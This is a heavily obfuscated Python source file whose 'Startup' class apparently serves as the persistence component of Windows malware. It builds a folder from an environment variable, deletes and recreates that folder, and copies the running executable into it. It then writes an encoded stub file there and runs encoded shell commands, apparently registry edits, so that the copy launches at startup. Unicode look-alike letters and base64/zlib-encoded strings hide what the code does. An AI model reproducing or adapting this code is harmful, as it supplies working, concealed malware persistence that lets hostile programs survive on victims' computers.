import subprocess
import os
import shutil
import sys

class Startup:

    def __init__(self):
        𝙨𝘦𝘵𝘢𝘁𝘁𝗿(𝘀𝘦𝙡𝙛, 'working_dir', 𝙤𝘀.getenv(__𝗶𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x0b\x0cs\n\x0cru\x0b\r\x0c\xb4\xb5\x05\x00\x17\xa5\x03\x89')).decode()) + __𝙞𝘮𝘱𝙤𝙧𝘁__('base64').b64decode(__𝙞𝙢𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x8bp\x0f+I\xf6\xc8\xa9\x8c\nw+\x05\x00\x1c\x0c\x04f')).decode())
        if 𝙨𝙚𝘭𝘧.check_self():
            return
        𝙨𝙚𝗹𝙛.mkdir()
        𝘀𝘦𝗹𝙛.write_stub()
        𝘴𝗲𝘭𝗳.regedit()

    def check_self(self):
        if 𝘰𝙨.path.realpath(𝘴𝘺𝘴.executable) == 𝙨𝘦𝙡𝘧.working_dir + __𝘪𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝗶𝗺𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\x0f\xcaHq65H\xf5\x08\xb4\x05\x00\x18\x83\x03\xa1')).decode():
            return True
        return False

    def mkdir(self):
        if not 𝗼𝙨.path.isdir(𝙨𝗲𝙡𝗳.working_dir):
            𝙤𝘀.mkdir(𝘴𝗲𝙡𝗳.working_dir)
        else:
            𝙨𝗵𝙪𝘵𝙞𝙡.rmtree(𝘀𝘦𝙡𝘧.working_dir)
            𝘰𝙨.mkdir(𝙨𝘦𝙡𝘧.working_dir)

    def write_stub(self):
        𝙨𝗵𝙪𝘵𝘪𝙡.copy2(𝘰𝘴.path.realpath(𝘴𝘺𝘀.executable), 𝘴𝗲𝘭𝘧.working_dir + __𝘪𝙢𝙥𝘰𝘳𝘁__('base64').b64decode(__𝙞𝗺𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8bp\x0f\xcaHq65H\xf5\x08\xb4\x05\x00\x18\x83\x03\xa1')).decode())
        with 𝙤𝗽𝙚𝗻(file=__𝘪𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝘪𝙢𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xdaK56LN\xce\x0b+\xf5\xc9\xf5\xcaHq\xb4\xb5\x05\x00.\x12\x05S')).decode().format(𝘀𝗲𝘭𝙛.working_dir), mode=__𝙞𝘮𝙥𝘰𝙧𝘵__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as 𝙛:
            𝙛.write(__𝘪𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x0bt\x0f\xcbJt\xb7HO2\x8a\xcau\xce\xf5\xcbHr/OO56L\x8erw3\xf0\xc9\x0b2Iq\xb4\xb5\x05\x00\xdc\x8e\x0b\x8a')).decode().format(𝙨𝗲𝗹𝗳.working_dir))

    def regedit(self):
        𝘀𝘶𝘣𝗽𝙧𝗼𝗰𝘦𝙨𝙨.run(args=[__𝘪𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK\xce\r\xcb\x03\x00\x03\xf1\x01\x95')).decode(), __𝗶𝘮𝘱𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8br\x0f+\x8e\x8a\x08\xca\x01\x00\x0c\x8c\x02\xdb')).decode(), __𝘪𝘮𝗽𝗼𝗿𝘵__('base64').b64decode(__𝗶𝙢𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x0bv-q\t\x0b\xab\x08I2\x8a2H1r\xab\x8c\n\xab\xf0K\x0c\xf7\xabL2\xf6+\x8b\xca\x0bJ\x0e3\xca)\x8dr\xb74N6\xacpI\x89\xf0\xaa\x8c\n75\x08\xcb\r\xabL6\xca)K\xca\xa9\x08N\t7\xb1\x05\x00\x1b\xfe\x170')).decode(), __𝙞𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝘪𝙢𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf31\x8e\xb4\x05\x00\x02\xbc\x01\x16')).decode(), __𝙞𝘮𝙥𝗼𝙧𝘵__('base64').b64decode(__𝗶𝗺𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x8b\n7,O\x8d\xf0\xca\x89\x0c7\xb1\x05\x00\x1a\x90\x03\xee')).decode(), __𝘪𝙢𝗽𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xf31\x8a\xb4\x05\x00\x02\xb9\x01\x15')).decode()], shell=True)
        𝙨𝘂𝙗𝘱𝘳𝗼𝙘𝗲𝘴𝘀.run(args=[__𝙞𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK\xce\r\xcb\x03\x00\x03\xf1\x01\x95')).decode(), __𝗶𝘮𝘱𝗼𝙧𝘵__('base64').b64decode(__𝗶𝗺𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8b\x0c\x0f\xca\x06\x00\x03|\x01n')).decode(), __𝙞𝙢𝙥𝘰𝙧𝘁__('base64').b64decode(__𝗶𝙢𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x0bv-q\t\x0b\xab\x08I2\x8a2H1r\xab\x8c\n\xab\xf0K\x0c\xf7\xabL2\xf6+\x8b\xca\x0bJ\x0e3\xca)\x8dr\xb74N6\xacpI\x89\xf0\xaa\x8c\n75\x08\xcb\r\xabL6\xca)K\xca\xa9\x08N\t7\xb1\x05\x00\x1b\xfe\x170')).decode(), __𝙞𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\xf31\x8e\xb4\x05\x00\x02\xbc\x01\x16')).decode(), __𝗶𝙢𝗽𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8b\n7,O\x8d\xf0\xca\x89\x0c7\xb1\x05\x00\x1a\x90\x03\xee')).decode(), __𝙞𝙢𝙥𝗼𝙧𝙩__('base64').b64decode(__𝘪𝘮𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf31\x0e\xb4\x05\x00\x02\xac\x01\x0e')).decode(), __𝘪𝘮𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x0b\xcd\x0e\xf3\x880\xf4K\x04\x00\x0b\xf9\x02\x97')).decode(), __𝙞𝙢𝙥𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf31\n\xb4\x05\x00\x02\xa9\x01\r')).decode(), __𝘪𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝘪𝘮𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK56LN\xce\x0b+\xf5\xc9\xf5\xcaHq\xb4\xb5\x05\x00.\x12\x05S')).decode().format(𝘴𝗲𝘭𝙛.working_dir), __𝗶𝗺𝙥𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf31\x8a\xb4\x05\x00\x02\xb9\x01\x15')).decode()], shell=True)